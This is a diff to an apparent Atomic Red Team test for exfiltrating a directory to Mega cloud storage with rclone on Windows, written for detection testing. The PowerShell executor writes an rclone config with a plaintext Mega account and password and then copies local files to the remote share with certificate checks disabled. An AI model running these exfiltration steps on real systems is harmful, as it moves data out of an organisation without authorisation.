@@ -1,9 +1,9 @@
 attack_technique: T1567.002
-display_name: Exfiltration Over Web Service to Mega Cloud Storage
+display_name: Exfiltration Over Web Service to Cloud Storage (Mega)
 atomic_tests:
-- name: Exfil data with rclone (Windows)
+- name: Exfil data with rclone to cloud Storage - Mega (Windows)
   description: |
-    This test uses rclone to exfiltrate data to a remote cloud storage instance.
+    This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)
     See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
   supported_platforms:
   - windows
@@ -12,10 +12,22 @@ atomic_tests:
       description: Directory of rclone.exe
       type: Path
       default: $env:temp\T1567.002\rclone-v*\
+    rclone_config_path:
+      description: Path to rclone's config file (default should be fine)
+      type: path
+      default: $env:appdata
     dir_to_copy:
       description: Directory to copy
       type: String
       default: $env:temp\T1567.002
+    mega_user_account:
+      description: Mega user account
+      type: String
+      default: atomictesting@outlook.com
+    mega_user_password:
+      description: Mega user password
+      type: String
+      default: vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA
     remote_share:
       description: Remote Mega share
       type: String
@@ -31,14 +43,18 @@ atomic_tests:
       Expand-archive -path $env:temp\rclone.zip -destinationpath $env:temp\T1567.002\ -force
   executor:
     command: |
+     New-Item #{rclone_config_path}\rclone -ItemType directory
+     New-Item #{rclone_config_path}\rclone\rclone.conf
      cd #{rclone_path}
-     .\rclone.exe config create #{remote_share} mega env_auth true user sparky pass GbS3QMe5O7FpjOFFR2pBea6FVFugxSgT
-     .\rclone.exe copy -P #{dir_to_copy} #{remote_share}: --no-check-certificate
+     .\rclone.exe config create #{remote_share} mega
+     set-Content #{rclone_config_path}\rclone\rclone.conf "[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"
+     .\rclone.exe copy #{dir_to_copy} #{remote_share}: --no-check-certificate
     cleanup_command: |
      cd #{rclone_path}
      .\rclone.exe delete #{remote_share}
      .\rclone.exe config delete #{remote_share}
      remove-item $env:temp\rclone.zip
-     remove-item #{dir_to_copy} -recurse -force -erroraction silentlycontinue
+     remove-item "#{dir_to_copy}" -recurse -force -erroraction silentlycontinue
+     remove-item #{rclone_config_path}\rclone -recurse -force -erroraction silentlycontinue
     name: powershell
     elevation_required: false
